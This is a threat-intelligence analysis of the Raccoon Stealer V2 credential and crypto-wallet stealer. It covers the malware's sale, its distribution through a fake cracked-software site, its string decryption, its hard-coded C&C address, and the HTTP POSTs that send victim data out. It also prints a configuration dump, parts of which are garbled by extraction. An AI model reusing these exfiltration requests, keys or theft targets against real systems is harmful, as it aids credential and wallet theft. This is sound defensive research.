The “special operation” that the operator referred to in the text was known as the\nRussia-Ukraine War, which killed one of the key developers of the Raccoon Stealer project,\nmaking the project no longer stable.\n\nIn a later post, the operator promised that they weren’t going out of business forever and that\nthey would return in a few months to work on a second version. It was also mentioned that\nsince the core developers can no longer participate, they will redevelop a new builder\nprogram and admin panel.\n\n**Quaxar is S2W’s CTI solution that enhances your organization’s cybersecurity through**\nmonitoring and monitoring.\n\n\n-----\n\nOn June 9th, about three and a half months later, the operator of Raccoon Stealer answered\na user’s question about whether it was right to return and worked on Raccoon Stealer V2 to\ntransform it into a completely new stealer compared to V1. It was also mentioned that the\ndetails will be provided after finishing the test period and that it will be officially released in\nabout two weeks.\n\n\n-----\n\nAfter the last post asking to inquire about V2 to contact via Telegram was uploaded, the\noriginal promotional post was closed by the moderator so that users can no longer comment\non the post to prevent confusion.\n\nThe operator of Raccoon Stealer uploaded a notice about the new version on May 17th, and\nthey claimed that V2 has the following advantages over V1.\n\nProcesses such as generating stealer by builder program, log processing, etc. are all\nfully automated\nWritten in C/C++, which significantly increased the speed of work\nLow AV detection rate\nExpanded target to collect\nBuilt-in file downloader\nWorks on both 32 and 64-bit systems without .NET dependencies\n\n\n-----\n\nAll strings ​​are heavily encrypted\n\nIn addition, the following features were mentioned for the admin panel.\n\nFast log processing\nFlexible search and filter system provided\nLatest log status updates\nCSV export, Log Preview, Browsing GEO, Mass deletion, etc\n\nThe pricing policy for the new version is as follows.\n\n$275 for 1 month of use ($75 increase over V1)\n$125 for 1 week of use ($50 increase over V1)\n\nIn addition to this, various improvements to the backend server and collection are specified\non the telegram channel.\n\n\n-----\n\n-----\n\nRaccoon Stealer.

Duplicate logs will be\nmarked with the double status.\n\n6. The unique ability to delegate logs will increase the efficiency of your team.\nEveryone will receive material for their needs.\n\n…\n\n## Changed stealer log\n\nRecently, while monitoring the deep and dark web, a log of Raccoon Stealer V2, which is\nbeing traded and shared among cybercriminals, was newly secured. The biggest difference\ncompared to the log in V1 is that from V2, the Raccoon-shaped signature is included in the\nlog. Also, some field names were changed, and computer names were excluded. Other than\nthat, only some batches were changed, and it was confirmed that the collected data did not\nchange significantly.\n\nRaccoon Stealer V1 Log (Left) / Raccoon Stealer V2 Log (Right)\n\n## Analysis of New Raccoon Stealer\n\n Distributed under the guise of Cracked Software\n\n\n-----\n\nAfter a new type of log file was obtained, after analyzing various files, we succeeded in\nobtaining a sample that looked like Raccoon Stealer V2. The sample was distributed through\nCracked Software in the same way as other Stealer malware, and it is not easy to determine\nwhether the sample is a new version of Raccoon Stealer without careful analysis. In addition,\nthrough the analysis of the distribution method, it was confirmed that other Stealer malware\nsuch as RedLine Stealer were also distributed in the campaign as described in the\n[FakeCrack Campaign recently released by Avast.](https://blog.avast.com/fakecrack-campaign)\n\nThe confirmed distribution site was a Cracked Software download site called “KEYS TOOL”\n(keystool[.]com), and when someone tries to download any program through that site, it\nconnects to the first Redirector page in the form of “freefiles[number].xyz” domain, and the\npage connects to the second Redirector page using the “.cfd” domain. The second\nRedirector page introduces a Mediafire link, and the link contains a fake installer file\ncontaining Stealer malware.\n\nStealer malware infection procedure\n\n\n-----\n\nCracked Software Download Site (Left) / Redirector Page (Right)\n\n## Technical Analysis of Raccoon Stealer V2\n\nThe Technical analysis of Raccoon Stealer V2 is as follows.\n\n\n-----\n\nMD5: 05a000d526a6e95be2b08e650394fa40\nSHA-1: b4cf85691dcc7c6e2d709b292056d404e7fb58f0\nSHA-256: 40daa898f98206806ad3ff78f63409d509922e0c482684cf4f180faac8cac273\nCreation Time: 2021–02–18 16:04:03 UTC\nFile name: 4.exe\nFile Type: x86, exe\nDetailed operation overview\n\n1. String decryption\n\nAs in V1, the string required for malicious behavior is extracted using Base64 and RC4\nalgorithms. The RC4 Key used at this time is fixed as “edinayarossiya”.\n\nEncrypted String: “VVsEvhkqyZGsN0Qv”\nRC4 Key: “edinayarossiya”\nDecrypted String: “\\cookies.txt”\n\n2. Extract the C&C server address\n\nRaccoon Stealer V2 can contain up to 5 C&C server addresses, which are encrypted and\nhard-coded with spaces in the Raccoon Stealer. Before decrypting the C&C server, all\nspaces are removed and extracted in the same way as in 1. String Decryption. For the RC4\nKey used at this time, a key different from that of other string decryption is used.\n\nEncrypted String: “lIdAg3LYd/akTgV0hVwlNF5b “\nRC4 Key: “403f7b121a3afd9e8d27f945140b8a92”\nDecrypted String: “http://2.58.56.247”\n\n3. Check the country of the infected device\n\n\n-----\n\nIt collects the Locale Name of the infected device through GetUserDefaultLocaleName\nfunction and checks whether the string “ru” is included, but after checking, no other action is\nimplemented yet.\n\n4. Create a mutex\n\nDuplicate execution is prevented through mutex. To prevent the malware to be started twice,\nthe process executed later is terminated.\n\n5. Check permission\n\nChecks whether the current process is running with “Local System” privileges. In V1, when\nrunning with Local System privileges, the token of explorer.exe was duplicated and executed\nwith the privileges, but in V2, this function is not yet fully implemented.\n\n6. Send basic information about the infected devices\n\nThe basic information about the infected device is collected and sent first. At this time, the\ninformation includes the “MachineGuid” and “Username” used to identify the infected device.\n```\nPOST / HTTP/1.1Accept: */*Content-Type: application/x-www-form-urlencoded;\ncharset=utf-8User-Agent: recordmachineId=[MachineGuid]|[Username]&configId=[RC4 Key\nused in ]\n\n```\n7. Receive configuration information from C&C\n\nWhen the basic information about the infected device is sent, the configuration information\nnecessary for malicious behavior is received from the C&C Server. The entire configuration\ninformation is as follows, and it has been changed from the JSON format in V1 to the custom\nformat now. This information includes various fields such as library file name and download\naddress, target wallet software, log file name, and target local file.\n\nData format in configuration information: [Field]_[Filename]:[Detailed Information]\n\n\n-----\n\n```\nlibs_nss3:http://2.58.56.247/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/nss3.dlllibs_msvcp140:ht\n Extension Settingsews_tronl:ibnejdfjmmkpcnlpebklmnkoeoihofec;TronLink;Local\nExtension\nSettingslibs_sqlite3:http://2.58.56.247/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/sqlite3.dllew\n Extension Settingsews_ronin:fnjhmkhhmkbjkkabndcnnogagogbneec;Ronin;Local Extension\nSettingswlts_exodus:Exodus;26;exodus;*;*partitio*,*cache*,*dictionar*wlts_atomic:Atomi\nstore.*;-wlts_coinomi:Coinomi;28;Coinomi\\Coinomi\\wallets;*;wlts_electrum:Electrum;26;Electrum\\wallets;*;-wlts_elecltc:Electrum-LTC;26;ElectrumLTC\\wallets;*;-wlts_elecbch:ElectronCash;26;ElectronCash\\wallets;*;wlts_guarda:Guarda;26;Guarda;*;*cache*,*IndexedDB*wlts_green:BlockstreamGreen;28;Block\n Live;26;Ledger\nLive;*;*cache*,*dictionar*,*sqlite*ews_ronin_e:kjmoohlgokccodicjjfebfomlbljgfhk;Ronin;\n Extension Settingsews_meta:nkbihfbeogaeaoehlefnkodbefgpgknn;MetaMask;Local Extension\nSettingssstmnfo_System Info.txt:System Information:|Installed\napplications:|libs_nssdbm3:http://2.58.56.247/aN7jD0qO6kT5bK5bQ4eR8fE1xP7hL2vK/nssdbm3\nMainnet;*;log*,*cache,chain,dictionar*wlts_mymonero:MyMonero;26;MyMonero;*;*cache*wlts\nwlts_wasabi:Wasabi;26;WalletWasabi\\\\Client;*;*tor*,*log*ews_metax:mcohilncbfahbmgdjkbp\n Extension\nSettingsews_xdefi:hmeobnfnfcmdkdcmlblgagmfpfboieaf;XDEFI;IndexedDBews_waveskeeper:lpil\n Extension Settingsews_solflare:bhhhlbepdkbapadjdnnojkbgioiodbic;Solflare;Local\nExtension Settingsews_rabby:acmacodkjbdgmoleebolmdjonilkdbch;Rabby;Local Extension\nSettingsews_cyano:dkdedlpgdmmkkfjabffeganieamfklkm;CyanoWallet;Local Extension\nSettingsews_coinbase:hnfanknocfeofbddgcijnmhnfnkdnaad;Coinbase;IndexedDBews_auromina:c\n Extension Settingsews_khc:hcflpincpppdclinealmandijcmnkbgn;KHC;Local Extension\nSettingsews_tezbox:mnfifefkajgofkcjkemidiaecocnkjeh;TezBox;Local Extension\nSettingsews_coin98:aeachknmefphepccionboohckonoeemg;Coin98;Local Extension\nSettingsews_temple:ookjlbkiijinhpmnjffcofjonbfbgaoc;Temple;Local Extension\nSettingsews_iconex:flpiciilemghbmfalicajoolhkkenfel;ICONex;Local Extension\nSettingsews_sollet:fhmfendgdocmcbmfikdcogofphimnkno;Sollet;Local Extension\nSettingsews_clover:nhnkbkgjikgcigadomkphalanndcapjk;CloverWallet;Local Extension\nSettingsews_polymesh:jojhfeoedkpkglbfimdfabpdfjaoolaf;PolymeshWallet;Local Extension\nSettingsews_neoline:cphhlgmgameodnhkjdmkpanlelnlohao;NeoLine;Local Extension\nSettingsews_keplr:dmkamcknogkgcdfhhbddcghachkejeap;Keplr;Local Extension\nSettingsews_terra_e:ajkhoeiiokighlmdnlakpjfoobnjinie;TerraStation;Local Extension\nSettingsews_terra:aiifbnbfobpmeekipheeijimdpnlpgpp;TerraStation;Local Extension\nSettingsews_liquality:kpfopkelmapcoipemfendmdcghnegimn;Liquality;Local Extension\nSettingsews_saturn:nkddgncdjgjfcddamfgcmfnlhccnimig;SaturnWallet;Local Extension\nSettingsews_guild:nanjmdknhkinifnkgdcggcfnhdaammmj;GuildWallet;Local Extension\nSettingsews_phantom:bfnaelmomeimhlpmgjnjophhpkkoljpa;Phantom;Local Extension\nSettingsews_tronlink:ibnejdfjmmkpcnlpebklmnkoeoihofec;TronLink;Local Extension\nSettingsews_brave:odbfpeeihdkbihmopkbjmoonfanlbfcl;Brave;Local Extension\nSettingsews_meta_e:ejbalbakoplchlghecdalmeeeajnimhm;MetaMask;Local Extension\nSettingsews_ronin_e:kjmoohlgokccodicjjfebfomlbljgfhk;Ronin;Local Extension\nSettingsews_mewcx:nlbmnnijcnlegkjjpcfjclmcfggfefdm;MEW_CX;Sync Extension\nSettingsews_ton:cgeeodpfagjceefieflmdfphplkenlfk;TON;Local Extension\nSettingsews_goby:jnkelfanjkeadonecabehalmbgpfodjm;Goby;Local Extension\nSettingsews_ton_ex:nphplpgoakhhjchkkhmiggakijnkhfnd;TON;Local Extension\nSettingsscrnsht_Screenshot.jpeg:1tlgrm_Telegram:Telegram\nDesktop\\tdata|*|*emoji*,*user_data*,*tdummy*,*dumps*token:1262c07cd3b0beaeb6f46b66fbfd\n\n```\n8. Set the working path and download library files\n\n\n-----\n\nDownload normal library files required for collection from the C&C server by referring to the\n**libs_ field included in the configuration information.**\n\nField: libs_[DLL Filename]:[Download Address]\nWorking Path: C:\\Users\\[Username]\\AppData\\LocalLow\nDownloaded DLLs\n\n— nss3.dll\n\n— msvcp140.dll\n\n— vcruntime140.dll\n\n— mozglue.dll\n\n— freebl3.dll\n\n— softokn3.dll\n\n— sqlite3.dll\n\n— nssdbm3.dll\n\n9. Add environment variable\n\nAdd the specific path included within the Raccoon Stealer to the environment variable, as\nwell as the working path specified in 8. Set working path and download library.\n\nC:\\Windows\\system32;\nC:\\Windows;\nC:\\Windows\\System32\\Wbem;\nC:\\Windows\\System32\\WindowsPowerShell\\\\v1.0\\\\;\nC:\\Users\\[Username]\\AppData\\LocalLow;\n\n[Working Path]\n\n10. Send detailed information about the infected device\n\nThe detailed information about the infected device is sent to the C&C server by referring to\nthe sstmnfo_ field in the configuration information. The information collected and sent is as\nfollows, and if it is successfully sent, a “receive” message is received from the server. In V1,\na file containing the information is created on the infected device, but in V2, the information is\nsent directly to the C&C server without creating a file.\n```\nPOST /[token] HTTP/1.1Accept: */*Content-Type: multipart/form-data; boundary=[Random\n16byte String]User-Agent: recordHost: 2.58.56.247Content-Length: 6854Connection:\nKeep-AliveCache-Control: no-cache–[Random 16byte String]Content-Disposition: formdata; name=\"file\"; filename=\"System Info.txt\"Content-Type: application/x-objectSystem\nInformation:   - Locale: Korean   - Time zone: +540 minutes from GMT   - OS:\nWindows 10 Enterprise N   - Architecture: x64   - CPU: Intel(R) Core(TM) i9-9880H\nCPU @ 2.30GH (4 cores)   - RAM: 8191 MB   - Display size: 2560x1331   - Display\nDevices:       0) VMware SVGA 3DInstalled applications:   [Application List]-[Random 16byte String]-\n```\n\n-----\n\n11. Exfiltrate stolen data from the infected device\n\nSearch and steal the target information and files to be collected by referring to the\nconfiguration information received in 7. Receive configuration information from C&C. The\ntarget information is as follows.\n\nData stored in the browser: Credentials, Profile, Autofill, Cookies, Credit card\ninformation, etc.\nBrowser-based wallet extension: Data for each browser-based wallet extension by\nreferring to the configuration information (MetaMask, TronLink, BinanceChain, Ronin,\ncoinomi, electrum, etc.)\nWallet software: By referring to the configuration information, wallet data for each wallet\nsoftware (exodus, atomic, jaxx, binance, coinomi, electrum, etc.) and the “wallet.dat’ file\nin local drives\nSpecific files in the local drives\nTelegram related data\nScreenshot of the infected device\n\nThe meaning of each field specified in the configuration information is as follows.\n\n12. Support for executing additional commands and downloading additional malware\n\nIf the ldr field exists in the configuration information, additional commands or processes are\nexecuted, or additional malware is downloaded and executed.\n\n## Compare Raccoon Stealer V1 and V2\n\n Commonality\n\n1 Same packer\n\n\n-----\n\nBoth Raccoon Stealer V1 and V2 use the same packer. This packer was used not only in\nRaccoon Stealer, but also in Vidar, KPot, and other stealers. The characteristic of this packer\nis that it is difficult to know which malware is included by creating a binary that wraps the\ninternal malware, and it is very difficult to create an automated unpacker tool.\n\n2. String decryption\n\nBoth V1 and V2 extract strings necessary for malicious behavior using Base64 and RC4\nalgorithms. Also, it is the same that the C&C server is hard-coded in the form of a string with\na lot of spaces.\n\n3. Working path\n\nThe working path used for library download and storage is also used in V2.\n\nWorking path: %USERPROFILE%\\AppData\\LocalLow\n\n## Difference\n\n1. Query format\n\n\n-----\n\nRaccoon Stealer sends the MachineGuid value and username of the infected device before\nsending detailed information and stolen data. While the Token value is encrypted in the\nRaccoon Stealer V1, it is hard-coded in plaintext in the Raccoon Stealer V2. In addition, this\nvalue is used as the RC4 Key value for decrypting the C&C server in the Raccoon Stealer\nV2.\n\nQuery format in V1\n\n— b=[MachineGuid]_[Username]&c=[Token]&f=json\n\nQuery format in V2\n\n— machineId=[MachineGuid]|[Username]&configId=[Token]\n\n2. Configuration information format\n\nRaccoon Stealer receives the configuration information necessary for malicious behavior\nfrom the C&C server, and the format of the configuration information was changed in V2. In\nV1, JSON format was used, but in V2 uses a custom format using “:”, “;”.\n\n3. How to send stolen data\n\nIn V1, after creating a log file in the working path, the directory is compressed and sent to the\nC&C server. However, in V2, it is no longer created as a file and immediately sent to the C&C\nserver.\n\n4. How to get the C&C server address\n\nIn V1, Google Drive and Telegram channels were used as a channel to obtain the C&C\nserver address dynamically, but in V2, this feature has not yet been confirmed and the C&C\nserver address is hard-coded in the stealer.\n\n\n-----\n\n## Conclusion\n\nAs a result of the analysis, it has been confirmed that this malware is the V2 version of\nthe Raccoon Stealer, and it is clear that Raccoon Stealer has resumed its operation in\nthat Stealer logs are already being traded and shared among cybercriminals.\nAs the Raccoon Stealer operator becomes active again, there is a possibility that\nexisting users will return to Raccoon Stealer, so it is necessary to prepare for Raccoon\nStealer V2.\nIt is judged that V2 will be continuously updated in the future in that there are still\nunfinished codes and features compared to V1.\nCurrently, it is distributed in the same way as V1, disguised as Cracked Software, but\nas it is updated to V2, continuous monitoring is required to see if there is any change in\nthe distribution method in the future\n\n## Reference\n\n Appendix.
